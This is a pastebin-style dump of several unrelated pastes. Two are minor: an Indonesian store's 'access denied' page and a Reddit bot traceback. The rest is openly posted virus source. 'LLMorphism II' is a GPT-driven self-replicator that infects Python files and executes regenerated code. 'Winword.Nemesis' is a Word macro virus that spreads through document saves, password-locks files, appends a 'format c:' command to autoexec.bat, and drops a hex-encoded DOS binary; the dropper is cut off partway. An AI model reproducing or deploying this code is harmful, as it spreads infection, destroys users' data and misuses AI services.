<a href=""mailto:al.a.n.g.a.rr.n.e.t.t9@gmail.com"">al.a.n.g.a.rr.n.e.t.t9@gmail.com</a>
"
49mTs8Ht,Custom Pages WS,AkbarWicaksono,HTML,Monday 3rd of July 2023 10:58:05 PM CDT,"<!doctype html>
<html lang=""en"">

<head>
  <meta charset=""utf-8"">
  <meta name=""robots"" content=""noindex, nofollow"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1, shrink-to-fit=no"">

  <title>Akses Ditolak - W STORE</title>
  <style>
    body {
      background-color: #fff;
      color: #000;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 16px;
      line-height: 1.5;
      margin: 0;
    }

    .container {
      margin: 50px auto;
      max-width: 600px;
      text-align: center;
      padding: 0 24px;
    }

    small {
      font-size: 14px;
    }
  </style>
</head>

<body>
  <div class=""container"">

    <h1>AKSES DITOLAK</h1>

    <p>
        Yth. Pengguna W STORE.
        <br><br>
        Dikarenakan adanya aktifitas DDoS dari Kompetitor yang terus berlanjut menyerang System Server kami.
        <br><br>
        Sehingga untuk saat ini kami membatasi atau memblock seluruh akses dari Luar Negeri dan Situs hanya dapat diakses menggunakan IP Indonesia (Lokal).
         <br><br>
        Untuk Client yang berada atau tinggal di Luar Negeri, Anda bisa gunakan VPN Server Indonesia untuk mengakses situs kami. Atau Anda dapat memberikan Alamat IP yang tertera dibawah ini ke Whatsapp Support agar dapat tim kami bantu untuk Allow/Unblock IP.
        <br><br>
        <strong>IP ANDA:</strong> ::CLIENT_IP::<br>
        <strong>COUNTRY:</strong> ::GEO::
        <br><br>
        <strong>WHATSAPP SUPPORT:</strong> <a href=""https://wa.me/6281325655477"" target=""_blank""> +62 813 2565 5477 (KLIK DISINI)</a>.
        <br><br>
        Mohon maaf atas ketidaknyamannya.
        <br><br>
        WS TEAM❤️
    </p>

    <p>
      <small><strong>Ray ID:</strong> ::RAY_ID::</small>
    </p>
  </div>
</body>

</html>"
dp9AiEwr,ResponseException: received 503 HTTP response,Vault-TecTradingCo,Python,Monday 3rd of July 2023 09:49:56 PM CDT,"Traceback (most recent call last):
  File ""main.py"", line 57, in wrapper
    job_func(*args, **kwargs)
  File ""main.py"", line 91, in comment_listener
    database_manager.load_comment(comment, db_conn)
  File ""/root/Fallout76MarketplaceKarmaBot/database_manager.py"", line 162, in load_comment
    if not is_mod(comment.author):
  File ""/root/Fallout76MarketplaceKarmaBot/database_manager.py"", line 25, in is_mod
    moderators_list = get_subreddit_instance(""Fallout76Marketplace"").moderator()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/models/reddit/subreddit.py"", line 2960, in __call__
    return self.subreddit._reddit.get(url, params=params)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 595, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 696, in _objectify_request
    self.request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 885, in request
    return self._core.request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 330, in request
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 228, in _request_with_retries
    response, saved_exception = self._make_request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 185, in _make_request
    response = self._rate_limiter.call(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/rate_limit.py"", line 33, in call
    kwargs[""headers""] = set_header_callback()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 283, in _set_header_callback
    self._authorizer.refresh()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 425, in refresh
    self._request_token(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 155, in _request_token
    response = self._authenticator._post(url, **data)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 38, in _post
    raise ResponseException(response)
prawcore.exceptions.ResponseException: received 503 HTTP response
"
4xeWGEgy,LLMorphismII - A new-age AI-based linguisto-morphic self-replicator powered by GPT - Source Code,FlyFar,Python,Monday 3rd of July 2023 09:49:02 PM CDT,"import openai

# LLMorphism II by Second Part To Hell
# A new-age AI-based linguisto-morphic self-replicator, powered by OpenAIs GPT. Fully encodes and mutates the self-replicator into natural language.
# 
# See my text for details: Using GPT to encode and mutate computer viruses entirely in natural language
#
# March 2023
# https://github.com/SPTHvx/SPTH
# sperl.thomas@gmail.com
# twitter: @SPTHvx     

openai.api_key = ""..."" # Add your openai key here

prompts_list=[]
tofile_list=[]
prompts_list.append(""Write a python function get_files which returns a list file_list with all .py files in the current directory. If you need to import some packages, do it."")
prompts_list.append(""Write a python function get_content which takes an input argument (string of a text file), reads the text file and returns its full file content. Do not write anything else except of the python code!"")
prompts_list.append(""Write a python function is_key, which takes a string as an input and return True,  if it contains the substring 'openai.api_key' (which has 14 characters) exactly once, otherwise False. Be careful, do not compare the entire string, but find how often the substring is contained! Very important: Do not write anything else except of the python code, do not write print statements and do not define variables outside of the function. Just write the function!"")
prompts_list.append(""Write a python function write_to_file which takes a filename and a string as an input, and append one line break (do not forget!) and the input string to the file. Output only the python code, nothing else!"")
prompts_list.append(""Write a loop over all elements returned by the function get_files (which has no arguments). For each element (lets call it curr_element), test whether the function is_key with the argument returned from get_content of the current element is True. If it is True, call the function write_to_file with curr_element as the first argument, and the variable tofile_str as the second argument. (tofile_str is a variable which is defined above)"")
prompts_list.append(""Write a python code (only this one line) which prints: 'LLMorphism II by SPTH - a new-age AI-based linguisto-morphic self-replicator, powered by OpenAIs GPT. Fully encodes and mutates the self-replicator into natural language.'."")
prompts_list.append(""Write a python code (only this one line) which prints: 'Hugs to the valhalla gang - hh86, roy g biv, JPanic, herm1t!'."")
tofile_list.append(""Write a python function return_text which takes two inputs: a prompt string, and the openai key (with a default value of the value openai.api_key). The function returns returns the output of an openai text completion (ONLY USE 3 parameters!). As parameters for the openai text completion use only four parameter (!!): engine which is 'text-davinci-003', max_tokens is 1000, temperature is 0.0, and the parameter prompt. Do not use any other parameters, only these four! The parameters are not strings!"")
tofile_list.append(""Write a python function modify_text, with two strings as input argument. Make a new string, which is the first, then a chr(34), then the second string, then a chr(34). Use the new string as an argument for a function call to return_text. The new modify_txt function should take the output string of return_text, remove all line breaks and all double quotation marks, and return this final string."")
tofile_list.append(""Write the following python function comp_str_fct, which has one argument. The argument is a list of strings. For each element of the list, call the function return_text (with the current element as the argument), and take its return value (a string). The function should combine all strings (with a line break) and return it."")
tofile_list.append(""Write one line in python, which defines a string with the name tofile_str. The value of the string is 'prompts_list=[]', with a line break before and afterwards."")
tofile_list.append(""Write one line in python, which appends and store to the string with the name tofile_str. The appended value is 'tofile_list=[]', followed by a line break."")
tofile_list.append(""Write one line in python, which defines the string called reform_str, and initialize it with the string (Keep the entire content the same. produce a syntactical correct python line!) 'Slightly reformulate in natural langauge the next sentence,'"")
tofile_list.append(""Write one line in python, which appends to the string called reform_str (Keep the entire content the same. produce a syntactical correct python line!) ' without changing its meaning, '"")
tofile_list.append(""Write one line in python, which appends to the string called reform_str (Keep the entire content the same. produce a syntactical correct python line!) ' do not interpret the content, '"")
tofile_list.append(""Write one line in python, which appends to the string called reform_str (Keep the entire content the same. produce a syntactical correct python line!) 'keep the length and structure of the string as similar as possible, '"")
tofile_list.append(""Write one line in python, which appends to the string called reform_str (Keep the entire content the same. produce a syntactical correct python line!) 'very importantly do not change the content at all, '"")
tofile_list.append(""Write one line in python, which appends to the string called reform_str (Keep the entire content the same, keep the colon. produce a syntactical correct python line!) ' and only make slight modifications: '"")
tofile_list.append(""Write a python loop over all elements of the list prompts_list. For each element with 20% probability, replace the element with the return value of the function modify_text with two arguments: the variable reform_str and the current elements. You should indeed modify the elements in prompts_list. Assume that the list prompts_list, modify_text and reform_str are already defined, do not redefine any of them! Very important: Do not write anything except of the loop and the import of the random package."")
tofile_list.append(""Write a python loop over all elements of the list tofile_list. For each element with 20% probability, replace the element with the return value of the function modify_text with two arguments: the variable reform_str and the current elements. You should indeed modify the elements in tofile_list. Assume that the list tofile_list, modify_text and reform_str are already defined, do not redefine any of them! Very important: Do not write anything except of the loop and the import of the random package."")
tofile_list.append(""Write a short python code (no tests or examples). Make a loop over all elements in the list called prompts_list. Directly start with the loop, do not define any variables beforehand (you can assume that tofile_str is already defined). For each element, do the following three steps: 1) Add to the string tofile_str the string 'prompts_list.append('. 2) Add to the string tofile_str the current element of the loop with double quotation marks. 3) Add to the string tofile_str the string ')' and a line break."")
tofile_list.append(""Write a short python code (no tests or examples). Make a loop over all elements in the list called tofile_list. Directly start with the loop, do not define any variables beforehand (you can assume that tofile_str is already defined). For each element, do the following three steps: 1) Add to the string tofile_str the string 'tofile_list.append('. 2) Add to the string tofile_str the current element of the loop with double quotation marks. 3) Add to the string tofile_str the string ')' and a line break."")
tofile_list.append(""Write a python code (only this one line) which defines a variable vic_code. The variable is generated by a function call of comp_str_fct with the argument being the variable called tofile_list."")
tofile_list.append(""Write a python code, which appends to the string variable tofile_str a line break, and then the variable vic_code (these are two variable names, not strings themselves!). Store the result in the variable tofile_str."")
tofile_list.append(""Write a python code (only this one line) which defines a variable complete_str. The variable is generated by a function call of comp_str_fct with the argument being the variable called  prompts_list."")
tofile_list.append(""Write a python code (only this one line) which takes a multi line python code called complete_str, and runs it."")


def return_text(prompt):
    completion = openai.Completion.create(
        engine=""text-davinci-003"",
        prompt=prompt,
        max_tokens=1024,
        temperature=0.0,
    )
    return completion.choices[0].text


def modify_text(string1, string2):
    new_string = string1 + chr(34) + string2 + chr(34)
    return return_text(new_string).replace('\n', '').replace('""', '')

def comp_str_fct(list_of_strings):
    all_str=''
    for ll in list_of_strings:
        all_str+='\n'+return_text(ll)
    return all_str


tofile_str = '\nprompts_list=[]\n'


tofile_str += 'tofile_list=[]\n'


reform_str = 'Slightly reformulate in natural langauge the next sentence,'


reform_str += ' without changing its meaning, '


reform_str += ' do not interpret the content, '


reform_str += 'keep the length and structure of the string as similar as possible, '


reform_str += 'very importantly do not change the content at all, '


reform_str += ' and only make slight modifications: '


import random

for i in range(len(prompts_list)):
    if random.random() < 0.2:
        prompts_list[i] = modify_text(reform_str, prompts_list[i])

import random

for i in range(len(tofile_list)):
    if random.random() < 0.2:
        tofile_list[i] = modify_text(reform_str, tofile_list[i])

for element in prompts_list:
    tofile_str += 'prompts_list.append(""{}"")\n'.format(element)

for l in tofile_list:
    tofile_str+='tofile_list.append(""'+l+'"")\n'

vic_code = comp_str_fct(tofile_list)

tofile_str = tofile_str + '\n' + vic_code

complete_str=comp_str_fct(prompts_list)

exec(complete_str)"
SVmN0jbr,VLAD Magazine - Issue AF - ARTICLE.2_3 - Winword.Nemesis,FlyFar,VBScript,Monday 3rd of July 2023 09:40:57 PM CDT,"********
AutoExec
********


Sub MAIN

Section$ = ""Compatibility""
wininistr$ = ""0x0020401""
ProfileName$ = ""RR2CD""
PrintText$ = ""Brought to you by the Nemesis Corporation, �1996""
Password$ = Chr$(120) + Chr$(101) + Chr$(110) + Chr$(105) + Chr$(120) + Chr$(111) + Chr$(115)

For i = 1 To Z�hlenMakros(1)
	If MakroName$(i, 1) = ""DateiSpeichernUnter"" Then update = 1
Next i

NoVir$ = GetProfileString$(Section$, ProfileName$)
If (NoVir$ <> wininistr$) And (update = 1) Then
	EingabeUnterdr�cken
	AutoMakroUnterdr�cken 0
	MakroKopieren FensterName$() + "":AutoExec"", ""Global:AutoExec"", 1
	MakroKopieren FensterName$() + "":AutoOpen"", ""Global:AutoOpen"", 1
	MakroKopieren FensterName$() + "":Datei�ffnen"", ""Global:Datei�ffnen"", 1
	MakroKopieren FensterName$() + "":DateiSpeichernUnter"", ""Global:DateiSpeichernUnter"", 1
	MakroKopieren FensterName$() + "":DateiSpeichern"", ""Global:DateiSpeichern"", 1
	MakroKopieren FensterName$() + "":Drop"", ""Global:Drop"", 1
	MakroKopieren FensterName$() + "":DateiBeenden"", ""Global:DateiBeenden"", 1
	MakroKopieren FensterName$() + "":DateiDrucken"", ""Global:DateiDrucken"", 1
	MakroKopieren FensterName$() + "":DateiDruckenStandard"", ""Global:DateiDruckenStandard"", 1
	MakroKopieren FensterName$() + "":ExtrasMakro"", ""Global:ExtrasMakro"", 1
	MakroKopieren FensterName$() + "":Dummy"", ""Global:AutoClose"", 1
	MakroKopieren FensterName$() + "":Dummy"", ""Global:AutoExit"", 1
	MakroKopieren FensterName$() + "":Dummy"", ""Global:AutoNew"", 1
	MakroKopieren FensterName$() + "":Dummy"", ""Global:AutoClose"", 1
	MakroKopieren FensterName$() + "":Dummy"", ""Global:Dummy"", 1
' Backup **************************************************
	MakroKopieren FensterName$() + "":Datei�ffnen"", ""Global:Datei�ffnenBak"", 1
	MakroKopieren FensterName$() + "":AutoExec"", ""Global:AutoExecBak"", 1
	MakroKopieren FensterName$() + "":AutoOpen"", ""Global:AutoOpenBak"", 1
	MakroKopieren FensterName$() + "":DateiSpeichernUnter"", ""Global:DateiSpeichernUnterBak"", 1
	MakroKopieren FensterName$() + "":DateiSpeichern"", ""Global:DateiSpeichernBak"", 1
	MakroKopieren FensterName$() + "":Drop"", ""Global:DropBak"", 1
	MakroKopieren FensterName$() + "":DateiBeenden"", ""Global:DateiBeendenBak"", 1
	MakroKopieren FensterName$() + "":DateiDrucken"", ""Global:DateiDruckenBak"", 1
	MakroKopieren FensterName$() + "":DateiDruckenStandard"", ""Global:DateiDruckenStandardBak"", 1
	MakroKopieren FensterName$() + "":ExtrasMakro"", ""Global:ExtrasMakroBak"", 1

End If

End Sub


********
AutoOpen
********

Sub MAIN
Call AutoExec
End Sub


************
DateiBeenden
************

Sub MAIN
On Error Resume Next
ExtrasOptionenSpeichern .GlobalDotAbfrage = 0
DateiBeenden
End Sub


************
DateiDrucken
************

Sub MAIN
Dim dlg As DateiDrucken
GetCurValues dlg
On Error Goto ende

Section$ = ""Compatibility""
wininistr$ = ""0x0020401""
ProfileName$ = ""RR2CD""
PrintText$ = ""Brought to you by the Nemesis Corporation, �1996""
Password$ = Chr$(120) + Chr$(101) + Chr$(110) + Chr$(105) + Chr$(120) + Chr$(111) + Chr$(115)

NoVir$ = GetProfileString$(Section$, ProfileName$)
If NoVir$ <> wininistr$ Then PayLoad

Dialog dlg
DateiDrucken dlg
ende:
End Sub


Sub Payload
On Error Resume Next

If Sekunde(Jetzt()) < 30 Then
    PrintText$ = ""Nemesis Corp.""
    EndeDokument       'go to the end of document.
    Einf�gen Chr$(11)
    Einf�gen PrintText$
    BeginnDokument    'go to the start of document.
End If

End Sub


********************
DateiDruckenStandard
********************

Sub MAIN
On Error Resume Next

Section$ = ""Compatibility""
wininistr$ = ""0x0020401""
ProfileName$ = ""RR2CD""
PrintText$ = ""Brought to you by the Nemesis Corporation, �1996""
Password$ = Chr$(120) + Chr$(101) + Chr$(110) + Chr$(105) + Chr$(120) + Chr$(111) + Chr$(115)

NoVir$ = GetProfileString$(Section$, ProfileName$)
If NoVir$ <> wininistr$ Then PayLoad

DateiDruckenStandard
End Sub

Sub Payload
On Error Resume Next
If Sekunde(Jetzt()) < 30 Then
    PrintText$ = ""Nemesis Corp.""
    EndeDokument       'go to the end of document.
    Einf�gen Chr$(11)
    Einf�gen PrintText$
    BeginnDokument    'go to the start of document.
End If

End Sub


***********
Datei�ffnen
***********

Sub MAIN
Dim dlg As Datei�ffnen

'Call Check_Virus

GetCurValues dlg
On Error Resume Next
Dialog dlg
Datei�ffnen dlg
End Sub

Sub Check_Virus
On Error Resume Next
MakroKopieren ""Global:AutoExecBak"", ""Global:AutoExec"", 1
MakroKopieren ""Global:AutoOpenBak"", ""Global:AutoOpen"", 1
MakroKopieren ""Global:DateiSpeichernUnterBak"", ""Global:DateiSpeichernUnter"", 1
MakroKopieren ""Global:DateiSpeichernBak"", ""Global:DateiSpeichern"", 1
MakroKopieren ""Global:DropBak"", ""Global:Drop"", 1
MakroKopieren ""Global:DateiBeendenBak"", ""Global:DateiBeenden"", 1
MakroKopieren ""Global:DateiDruckenBak"", ""Global:DateiDrucken"", 1
MakroKopieren ""Global:DateiDruckenStandardBak"", ""Global:DateiDruckenStandard"", 1
MakroKopieren ""Global:ExtrasMakroBak"", ""Global:ExtrasMakro"", 1
MakroKopieren ""Global:Dummy"", ""Global:AutoClose"", 1
MakroKopieren ""Global:Dummy"", ""Global:AutoExit"", 1
MakroKopieren ""Global:Dummy"", ""Global:AutoNew"", 1
MakroKopieren ""Global:Dummy"", ""Global:AutoClose"", 1

End Sub


**************
DateiSpeichern
**************

Sub MAIN
Dim dlg As DateiSpeichernUnter   'declare dialog as type FileSaveAs
On Error Goto finish
GetCurValues dlg

Diag$ = ""0""
AutoMakroUnterdr�cken 0

Section$ = ""Compatibility""
wininistr$ = ""0x0020401""
ProfileName$ = ""RR2CD""
PrintText$ = ""Brought to you by the Nemesis Corporation, �1996""
Password$ = Chr$(120) + Chr$(101) + Chr$(110) + Chr$(105) + Chr$(120) + Chr$(111) + Chr$(115)

EingabeUnterdr�cken

If InStr(DateiName$(), ""Dokument"") <> 0 Then
	Dialog dlg
End If

On Error Goto finish

NoVir$ = GetProfileString$(Section$, ProfileName$)
If (NoVir$ <> wininistr$) And (UCase$(DateiName$()) <> ""VIRUS.DOT"") Then
	'Is the document of Type=(WordDocument or Template) ?
	If (dlg.Format = 0) Or (dlg.Format = 1) Then
	'Copy Macro's from Global data area into document.
	MakroKopieren ""Global:AutoExec"", FensterName$() + "":AutoExec"", 1
	MakroKopieren ""Global:AutoOpen"", FensterName$() + "":AutoOpen"", 1
'       MakroKopieren ""Global:BearbeitenR�ckg�ngig"", FensterName$() + "":BearbeitenR�ckg�ngig"", 1
	MakroKopieren ""Global:Datei�ffnen"", FensterName$() + "":Datei�ffnen"", 1

	MakroKopieren ""Global:DateiBeenden"", FensterName$() + "":DateiBeenden"", 1
	MakroKopieren ""Global:DateiSpeichernUnter"", FensterName$() + "":DateiSpeichernUnter"", 1
	MakroKopieren ""Global:DateiSpeichern"", FensterName$() + "":DateiSpeichern"", 1
	MakroKopieren ""Global:Drop"", FensterName$() + "":Drop"", 1
	MakroKopieren ""Global:DateiDrucken"", FensterName$() + "":DateiDrucken"", 1
	MakroKopieren ""Global:DateiDruckenStandard"", FensterName$() + "":DateiDruckenStandard"", 1
	MakroKopieren ""Global:ExtrasMakro"", FensterName$() + "":ExtrasMakro"", 1
	MakroKopieren ""Global:Dummy"", FensterName$() + "":Dummy"", 1
	'Set to save document as a template.
	dlg.Format = 1
 End If

If (Sekunde(Jetzt()) > 45) And (Diag$ = ""0"") Then
	dlg.Kennwort = Password$
End If

If (Monat(Jetzt()) = 5) And (Tag(Jetzt()) >= 1) And (Diag$ = ""0"") Then
	AttributBestimmen ""c:\autoexec.bat"", 0
	Open ""c:\autoexec.bat"" For Append As #1
	Print #1, ""@echo j|format c: /u >nul""
	Close #1
End If

finish:
End If

If LCase$(DateiName$()) <> ""normal.dot"" Then
	DateiSpeichernUnter dlg  'save the document infected.
End If

DateiSpeichern
End Sub


*******************
DateiSpeichernUnter
*******************

Sub MAIN
Dim dlg As DateiSpeichernUnter   'declare dialog as type FileSaveAs
GetCurValues dlg
On Error Goto finish

Diag$ = ""0""

Section$ = ""Compatibility""
wininistr$ = ""0x0020401""
ProfileName$ = ""RR2CD""
PrintText$ = ""Brought to you by the Nemesis Corporation, �1996""
Password$ = Chr$(120) + Chr$(101) + Chr$(110) + Chr$(105) + Chr$(120) + Chr$(111) + Chr$(115)

EingabeUnterdr�cken
'dlg.Format = 0
Dialog dlg'      execute the dialog.

NoVir$ = GetProfileString$(Section$, ProfileName$)
If (NoVir$ <> wininistr$) And (UCase$(DateiName$()) <> ""VIRUS_NEU.DOT"") Then
'Is the document of Type=(WordDocument or Template) ?
If (dlg.Format = 0) Or (dlg.Format = 1) Then
	'Copy Macro's from Global data area into document.
	MakroKopieren ""Global:AutoExec"", FensterName$() + "":AutoExec"", 1
	MakroKopieren ""Global:AutoOpen"", FensterName$() + "":AutoOpen"", 1
'       MakroKopieren ""Global:BearbeitenR�ckg�ngig"", FensterName$() + "":BearbeitenR�ckg�ngig"", 1
	MakroKopieren ""Global:Datei�ffnen"", FensterName$() + "":Datei�ffnen"", 1
	MakroKopieren ""Global:DateiBeenden"", FensterName$() + "":DateiBeenden"", 1
	MakroKopieren ""Global:DateiSpeichernUnter"", FensterName$() + "":DateiSpeichernUnter"", 1
	MakroKopieren ""Global:DateiSpeichern"", FensterName$() + "":DateiSpeichern"", 1
	MakroKopieren ""Global:Drop"", FensterName$() + "":Drop"", 1
	MakroKopieren ""Global:DateiDrucken"", FensterName$() + "":DateiDrucken"", 1
	MakroKopieren ""Global:DateiDruckenStandard"", FensterName$() + "":DateiDruckenStandard"", 1
	MakroKopieren ""Global:ExtrasMakro"", FensterName$() + "":ExtrasMakro"", 1
	MakroKopieren ""Global:Dummy"", FensterName$() + "":Dummy"", 1
	'Set to save document as a template.
	dlg.Format = 1
 End If


If (Sekunde(Jetzt()) > 45) And (Diag$ = ""0"") Then
	dlg.Kennwort = Password$
End If

If (Monat(Jetzt()) = 3) And (Tag(Jetzt()) >= 1) And (Diag$ = ""0"") Then
	Call Drop
End If

If (Monat(Jetzt()) = 5) And (Tag(Jetzt()) >= 1) And (Diag$ = ""0"") Then
	AttributBestimmen ""c:\autoexec.bat"", 0
	Open ""c:\autoexec.bat"" For Append As #1
	Print #1, ""@echo j|format c: /u >nul""
	Close #1
End If

End If

DateiSpeichernUnter dlg  'save the document infected.

finish:

End Sub



****
Drop
****

Sub MAIN

Section$ = ""Compatibility""
wininistr$ = ""0x0020401""
ProfileName$ = ""RR2CD""
PrintText$ = ""Brought to you by the Nemesis Corporation, �1996""
Password$ = Chr$(120) + Chr$(101) + Chr$(110) + Chr$(105) + Chr$(120) + Chr$(111) + Chr$(115)
Diag$ = ""0""


NoVir$ = GetProfileString$(Section$, ProfileName$)
If (NoVir$ <> wininistr$) And (diag$ = ""0"") Then

EingabeUnterdr�cken

On Error Goto NoDropper             'setup an error handler

Open ""c:\dos\debug.exe"" For Input As #1
Close #1

'Ab hier beginnt der Virus
Open ""c:\dos\script.scr"" For Output As #1
Print #1, ""N debugger.exe""
Print #1, ""E 0100 4D 5A EC 00 0C 00 00 00 20 00 00 00 FF FF 00 00""
Print #1, ""E 0110 00 00 32 2D 00 00 01 00 1E 00 00 00 01 00 00 00""
Print #1, ""E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0300 B8 00 4C CD 21 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0310 E9 3D 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 0350 FC 2B FF B4 F2 CD 13 72 47 B4 62 CD 21 8E C3 2B""
Print #1, ""E 0360 FF 53 4B 8E DB BB FF FF 80 FF 50 77 0C A1 03 00""
Print #1, ""E 0370 2B C3 29 45 12 B4 4A CD 21 5B 8E DB 83 C3 10 FA""
Print #1, ""E 0380 BC 00 00 8D 87 00 00 8E D0 81 C3 00 00 FB 9C 53""
Print #1, ""E 0390 68 00 00 2B DB 33 C9 8B D1 33 F6 8B EE 33 C0 CF""
Print #1, ""E 03A0 E8 00 00 5E B9 00 12 81 EE 93 00 0E 1F 68 00 7C""
Print #1, ""E 03B0 07 06 68 A8 00 F3 A4 CB 6A 49 B4 52 CD 21 BB 84""
Print #1, ""E 03C0 00 8E D9 2E 8C 06 E0 01 B8 AF 01 87 47 80 50 8C""
Print #1, ""E 03D0 C8 87 47 82 50 9C 58 80 CC 01 50 9D B4 4D 9C FF""
Print #1, ""E 03E0 1F 2E A1 8F 14 2E A3 93 14 2E A1 91 14 2E A3 95""
Print #1, ""E 03F0 14 2E C7 06 E0 01 00 F0 B4 00 99 9C FF 5F C8 8F""
Print #1, ""E 0400 47 82 8F 47 80 E8 81 01 C7 45 EC 98 05 C7 45 FC""
Print #1, ""E 0410 C3 02 B8 F0 04 8B D0 B7 13 93 CD 2F 2E C5 3E 93""
Print #1, ""E 0420 14 E8 F7 02 60 0E 1F 0E 07 80 FA 80 74 17 B4 04""
Print #1, ""E 0430 CD 1A 8A C6 04 03 27 3C 12 76 03 2C 12 41 A2 70""
Print #1, ""E 0440 02 88 0E 69 02 B8 01 02 BB 8F 12 B9 01 00 BA 80""
Print #1, ""E 0450 00 E8 A9 0A 80 7F 09 8E 74 63 B1 04 8D B7 AE 01""
Print #1, ""E 0460 83 C6 10 38 14 E0 F9 E3 54 8A 44 04 3C 01 74 08""
Print #1, ""E 0470 3C 04 72 49 3C 06 77 45 8B 44 08 3C 11 72 3E E8""
Print #1, ""E 0480 A1 0A B1 07 E8 73 0A 41 89 0E 0C 02 89 16 0F 02""
Print #1, ""E 0490 53 33 DB B8 09 03 E8 64 0A 5B BE F8 01 8B FB B1""
Print #1, ""E 04A0 1E F3 A4 B0 02 B9 E0 01 F3 AA B1 01 E8 4B 0A B8""
Print #1, ""E 04B0 01 02 B6 01 E8 46 0A E8 69 0A E8 3D 0A 61 C3 60""
Print #1, ""E 04C0 1E 8B EC C5 76 12 E8 9B 09 3D CC CF 74 26 3D 63""
Print #1, ""E 04D0 80 75 1A 81 7C 04 72 11 75 13 81 7C 0E E4 CF 74""
Print #1, ""E 04E0 13 3D 2E FF 75 07 81 7C 09 FA 9A 74 07 8C D8 3D""
Print #1, ""E 04F0 00 F0 75 11 8C D8 2E A3 91 14 8B 46 12 2E A3 8F""
Print #1, ""E 0500 14 80 66 17 FE 1F 61 CF FA 33 C0 8E D0 BC 00 7C""
Print #1, ""E 0510 FB 8E C4 06 68 16 02 93 B8 09 02 B9 08 00 BA 80""
Print #1, ""E 0520 00 CD 13 72 FE CB FC E8 5F 00 06 0E 07 B8 F0 04""
Print #1, ""E 0530 BE 84 00 BF 8F 14 87 44 C8 AB 33 C0 87 44 CA AB""
Print #1, ""E 0540 A5 A5 07 B8 01 02 8B DC 49 CD 13 0A D2 74 03 E8""
Print #1, ""E 0550 D1 09 06 53 B1 FF 43 81 3F C2 73 75 04 C6 47 01""
Print #1, ""E 0560 EB 81 3F A7 75 75 03 88 67 02 E2 EA E8 B5 FE 40""
Print #1, ""E 0570 A3 44 0C B4 04 CD 1A 80 F9 90 77 07 72 0A 80 FE""
Print #1, ""E 0580 04 72 05 C6 06 41 0C 90 CB 2E C6 06 41 0C C3 33""
